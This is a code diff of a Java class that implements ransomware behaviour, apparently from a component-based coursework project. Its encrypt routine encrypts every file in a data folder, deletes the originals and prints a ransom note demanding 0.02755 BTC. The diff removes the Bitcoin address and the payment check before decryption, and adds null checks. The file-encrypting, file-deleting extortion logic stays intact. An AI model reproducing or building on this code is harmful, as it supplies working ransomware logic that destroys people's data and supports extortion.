@@ -13,7 +13,6 @@ public class Report {
     AESUtils aesUtils;
     File dataFolder;
     File encryptedDataFolder;
-    private PublicKey address;
 
     public Report() {
         this.port = new Port();
@@ -33,9 +32,7 @@ public class Report {
     public static Report getInstance() {
         return instance;
     }
-    private void setAddress(PublicKey address){
-        this.address = address;
-    }
+
 
     private void encryptFile(File inFile) {
         byte[] encryptedBytes;
@@ -69,9 +66,11 @@ public class Report {
 
     private void encryptDataFolder() {
         File[] files = dataFolder.listFiles();
-        for (File file : files) {
-            encryptFile(file);
-            file.delete();
+        if (files != null) {
+            for (File file : files) {
+                encryptFile(file);
+                file.delete();
+            }
         }
         System.out.println("---------------------------------");
         System.out.println("„Oops, your files have been encrypted. With a payment of 0.02755 BTC all\n" +
@@ -79,36 +78,29 @@ public class Report {
         System.out.println("---------------------------------");
     }
 
-    private void decryptFolder(float credit) {
-        if (credit==0.02755){
-        if (encryptedDataFolder.exists()) {
-            File[] files = new File(String.valueOf(encryptedDataFolder)).listFiles();
-            for (File file : files) {
-                decryptFile(file);
-                file.delete();
+    private void decryptFolder() {
+            if (encryptedDataFolder.exists()) {
+                File[] files = new File(String.valueOf(encryptedDataFolder)).listFiles();
+                if (files != null) {
+                    for (File file : files) {
+                        decryptFile(file);
+                        file.delete();
+                    }
+                }
+                encryptedDataFolder.delete();
             }
-            encryptedDataFolder.delete();
         }
-    }}
-    private void getRecipientAddress(){
-        System.out.println("Please transfer the BTC to the  Bitcoin-address "+ this.address);
-
-    }
 
     public class Port implements IReport {
 
         public void encrypt() {
             String directoryName =  this.getClass().getClassLoader().getResource("").getPath();
-            System.out.println("Current Working Directory is = " +directoryName);
             encryptDataFolder();
         }
 
-        public void decrypt(float credit) {
-                decryptFolder(credit);
+        public void decrypt() {
+            decryptFolder();
         }
 
-        public void showRecipientAddress(){
-            getRecipientAddress();
-        }
     }
 }
